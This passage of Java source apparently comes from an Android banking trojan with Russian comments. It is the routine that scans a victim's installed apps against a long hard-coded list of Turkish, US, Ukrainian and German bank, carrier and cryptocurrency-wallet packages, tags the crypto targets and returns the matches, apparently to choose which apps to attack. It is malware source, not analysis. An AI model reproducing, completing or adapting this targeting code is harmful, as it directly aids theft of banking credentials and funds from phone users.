            if ((packageInfo.packageName.equals("nl.snsbank.mobielbetalen"))) BBB += "nl.snsbank.mobielbetalen,";
            //--TR----
            if ((packageInfo.packageName.equals("com.btcturk"))) BBB += "com.btcturk,";
            if ((packageInfo.packageName.equals("com.finansbank.mobile.cepsube"))) BBB += "com.finansbank.mobile.cepsube,";
            if ((packageInfo.packageName.equals("com.ingbanktr.ingmobil"))) BBB += "com.ingbanktr.ingmobil,";
            if ((packageInfo.packageName.equals("com.kuveytturk.mobil"))) BBB += "com.kuveytturk.mobil,";
            if ((packageInfo.packageName.equals("com.magiclick.odeabank"))) BBB += "com.magiclick.odeabank,";
            if ((packageInfo.packageName.equals("com.mobillium.papara"))) BBB += "com.mobillium.papara,";
            if ((packageInfo.packageName.equals("com.pozitron.albarakaturk"))) BBB += "com.pozitron.albarakaturk,";
            if ((packageInfo.packageName.equals("com.teb"))) BBB += "com.teb,";
            if ((packageInfo.packageName.equals("com.tmob.denizbank"))) BBB += "com.tmob.denizbank,";
            if ((packageInfo.packageName.equals("com.ykb.android"))) BBB += "com.ykb.android,";
            if ((packageInfo.packageName.equals("finansbank.enpara"))) BBB += "finansbank.enpara,";
            if ((packageInfo.packageName.equals("tr.com.hsbc.hsbcturkey"))) BBB += "tr.com.hsbc.hsbcturkey,";
            if ((packageInfo.packageName.equals("tr.com.sekerbilisim.mbank"))) BBB += "tr.com.sekerbilisim.mbank,";
            //--US----
            if ((packageInfo.packageName.equals("com.att.myWireless"))) BBB += "com.att.myWireless,";
            if ((packageInfo.packageName.equals("com.vzw.hss.myverizon"))) BBB += "com.vzw.hss.myverizon,";
            if ((packageInfo.packageName.equals("aib.ibank.android"))) BBB += "aib.ibank.android,";
            if ((packageInfo.packageName.equals("com.bbnt"))) BBB += "com.bbnt,";
            if ((packageInfo.packageName.equals("com.csg.cs.dnmbs"))) BBB += "com.csg.cs.dnmbs,";
            if ((packageInfo.packageName.equals("com.discoverfinancial.mobile"))) BBB += "com.discoverfinancial.mobile,";
            if ((packageInfo.packageName.equals("com.eastwest.mobile"))) BBB += "com.eastwest.mobile,";
            if ((packageInfo.packageName.equals("com.fi6256.godough"))) BBB += "com.fi6256.godough,";
            if ((packageInfo.packageName.equals("com.fi6543.godough"))) BBB += "com.fi6543.godough,";
            if ((packageInfo.packageName.equals("com.fi6665.godough"))) BBB += "com.fi6665.godough,";
            if ((packageInfo.packageName.equals("com.fi9228.godough"))) BBB += "com.fi9228.godough,";
            if ((packageInfo.packageName.equals("com.fi9908.godough"))) BBB += "com.fi9908.godough,";
            if ((packageInfo.packageName.equals("com.ifs.banking.fiid1369"))) BBB += "com.ifs.banking.fiid1369,";
            if ((packageInfo.packageName.equals("com.ifs.mobilebanking.fiid3919"))) BBB += "com.ifs.mobilebanking.fiid3919,";
            if ((packageInfo.packageName.equals("com.jackhenry.rockvillebankct"))) BBB += "com.jackhenry.rockvillebankct,";
            if ((packageInfo.packageName.equals("com.jackhenry.washingtontrustbankwa"))) BBB += "com.jackhenry.washingtontrustbankwa,";
            if ((packageInfo.packageName.equals("com.jpm.sig.android"))) BBB += "com.jpm.sig.android,";
            if ((packageInfo.packageName.equals("com.sterling.onepay"))) BBB += "com.sterling.onepay,";
            if ((packageInfo.packageName.equals("com.svb.mobilebanking"))) BBB += "com.svb.mobilebanking,";
            if ((packageInfo.packageName.equals("org.usemployees.mobile"))) BBB += "org.usemployees.mobile,";
            if ((packageInfo.packageName.equals("pinacleMobileiPhoneApp.android"))) BBB += "pinacleMobileiPhoneApp.android,";
            //------------UA--------------


            if ((packageInfo.packageName.equals("com.fuib.android.spot.online"))) BBB += "com.fuib.android.spot.online,";
            if ((packageInfo.packageName.equals("com.ukrsibbank.client.android"))) BBB += "com.ukrsibbank.client.android,";
            if ((packageInfo.packageName.equals("ru.alfabank.mobile.ua.android"))) BBB += "ru.alfabank.mobile.ua.android,";
            if ((packageInfo.packageName.equals("ua.aval.dbo.client.android"))) BBB += "ua.aval.dbo.client.android,";
            if ((packageInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.otp"))) BBB += "ua.com.cs.ifobs.mobile.android.otp,";
            if ((packageInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.pivd"))) BBB += "ua.com.cs.ifobs.mobile.android.pivd,";
            if ((packageInfo.packageName.equals("ua.oschadbank.online"))) BBB += "ua.oschadbank.online,";
            if ((packageInfo.packageName.equals("ua.privatbank.ap24"))) BBB += "ua.privatbank.ap24,";


            //-------------------КРИПТЫ------------------------------------------
            if ((packageInfo.packageName.equals("com.Plus500"))) BBB += "com.Plus500(Crypt)+,";
            if ((packageInfo.packageName.equals("eu.unicreditgroup.hvbapptan"))) BBB += "eu.unicreditgroup.hvbapptan,";
            if ((packageInfo.packageName.equals("com.targo_prod.bad"))) BBB += "com.targo_prod.bad,";
            if ((packageInfo.packageName.equals("com.db.pwcc.dbmobile"))) BBB += "com.db.pwcc.dbmobile,";
            if ((packageInfo.packageName.equals("com.db.mm.norisbank"))) BBB += "com.db.mm.norisbank,";


            if ((packageInfo.packageName.equals("com.bitmarket.trader"))) BBB += "com.bitmarket.trader(Crypt)+,";
            if ((packageInfo.packageName.equals("com.plunien.poloniex"))) BBB += "com.plunien.poloniex(Crypt)+,";
            if ((packageInfo.packageName.equals("com.bitmarket.trader"))) BBB += "com.bitmarket.trader(Crypt)+,";
            if ((packageInfo.packageName.equals("com.mycelium.wallet"))) BBB += "com.mycelium.wallet(Crypt)+,";
            if ((packageInfo.packageName.equals("com.bitfinex.bfxapp"))) BBB += "com.bitfinex.bfxapp(Crypt)+,";
            if ((packageInfo.packageName.equals("com.binance.dev"))) BBB += "com.binance.dev(Crypt)+,";
            if ((packageInfo.packageName.equals("com.btcturk"))) BBB += "com.btcturk(Crypt),";
            if ((packageInfo.packageName.equals("com.binance.odapplications"))) BBB += "com.binance.odapplications(Crypt),";

            if ((packageInfo.packageName.equals("com.blockfolio.blockfolio"))) BBB += "com.blockfolio.blockfolio(Crypt),";
            if ((packageInfo.packageName.equals("com.crypter.cryptocyrrency"))) BBB += "com.crypter.cryptocyrrency(Crypt),";
            if ((packageInfo.packageName.equals("io.getdelta.android"))) BBB += "io.getdelta.android(Crypt),";
            if ((packageInfo.packageName.equals("com.edsoftapps.mycoinsvalue"))) BBB += "com.edsoftapps.mycoinsvalue(Crypt),";
            if ((packageInfo.packageName.equals("com.coin.profit"))) BBB += "com.coin.profit(Crypt),";
            if ((packageInfo.packageName.equals("com.mal.saul.coinmarketcap"))) BBB += "com.mal.saul.coinmarketcap(Crypt),";
            if ((packageInfo.packageName.equals("com.tnx.apps.coinportfolio"))) BBB += "com.tnx.apps.coinportfolio(Crypt),";

            if ((packageInfo.packageName.equals("com.coinbase.android"))) BBB += "com.coinbase.android(Crypt)+,";
            if ((packageInfo.packageName.equals("com.portfolio.coinbase_tracker"))) BBB += "com.portfolio.coinbase_tracker(Crypt)+,";

            if ((packageInfo.packageName.equals("de.schildbach.wallet"))) BBB += "de.schildbach.wallet(Crypt),";

            if ((packageInfo.packageName.equals("piuk.blockchain.android"))) BBB += "piuk.blockchain.android(Crypt)+,";


            if ((packageInfo.packageName.equals("info.blockchain.merchant"))) BBB += "info.blockchain.merchant(Crypt)+,";

            if ((packageInfo.packageName.equals("com.jackpf.blockchainsearch"))) BBB += "com.jackpf.blockchainsearch(Crypt),";

            if ((packageInfo.packageName.equals("com.unocoin.unocoinwallet"))) BBB += "com.unocoin.unocoinwallet(Crypt)+,";
            if ((packageInfo.packageName.equals("com.unocoin.unocoinmerchantPoS"))) BBB += "com.unocoin.unocoinmerchantPoS(Crypt)+,";

            if ((packageInfo.packageName.equals("com.thunkable.android.santoshmehta364.UNOCOIN_LIVE"))) BBB += "com.thunkable.android.santoshmehta364.UNOCOIN_LIVE(Crypt),";

            if ((packageInfo.packageName.equals("wos.com.zebpay"))) BBB += "wos.com.zebpay(Crypt)+,";

            if ((packageInfo.packageName.equals("com.localbitcoinsmbapp"))) BBB += "com.localbitcoinsmbapp(Crypt)+,";
            if ((packageInfo.packageName.equals("com.thunkable.android.manirana54.LocalBitCoins"))) BBB += "com.thunkable.android.manirana54.LocalBitCoins(Crypt)+,";
            if ((packageInfo.packageName.equals("com.thunkable.android.manirana54.LocalBitCoins_unblock"))) BBB += "com.thunkable.android.manirana54.LocalBitCoins_unblock(Crypt)+,";
            if ((packageInfo.packageName.equals("com.localbitcoins.exchange"))) BBB += "com.localbitcoins.exchange(Crypt)+,";
            if ((packageInfo.packageName.equals("com.coins.bit.local"))) BBB += "com.coins.bit.local(Crypt)+,";
            if ((packageInfo.packageName.equals("com.coins.ful.bit"))) BBB += "com.coins.ful.bit(Crypt)+,";
            if ((packageInfo.packageName.equals("com.jamalabbasii1998.localbitcoin"))) BBB += "com.jamalabbasii1998.localbitcoin(Crypt)+,";

            if ((packageInfo.packageName.equals("zebpay.Application"))) BBB += " zebpay.Application(Crypt)+,";
            if ((packageInfo.packageName.equals("xmr.org.freewallet.app"))) BBB += "xmr.org.freewallet.app(Crypt)+,";



            if ((packageInfo.packageName.equals("com.bitcoin.ss.zebpayindia"))) BBB += "com.bitcoin.ss.zebpayindia(Crypt),";

            if ((packageInfo.packageName.equals("com.kryptokit.jaxx"))) BBB += "com.kryptokit.jaxx(Crypt),";

        }
        //Дописываем в конце!
        if(BBB.contains("com.paypal.android.p2pmobile,")){
            BBB = BBB.replace("com.paypal.android.p2pmobile,","");
            BBB = BBB+"com.paypal.android.p2pmobile,";
        }
        if(BBB.contains("com.amazon.mShop.android.shopping,")) {
            BBB = BBB.replace("com.amazon.mShop.android.shopping,", "");
            BBB = BBB + "com.amazon.mShop.android.shopping,";
        }
        if(BBB.contains("com.ebay.mobile,")){
            BBB = BBB.replace("com.ebay.mobile,","");
            BBB = BBB+"com.ebay.mobile,";
        }
        /*BBB = BBB.replace("||","|" + '\n' + "|");
        BBB = BBB.replace("||","|");*/
        return BBB;
    }
}
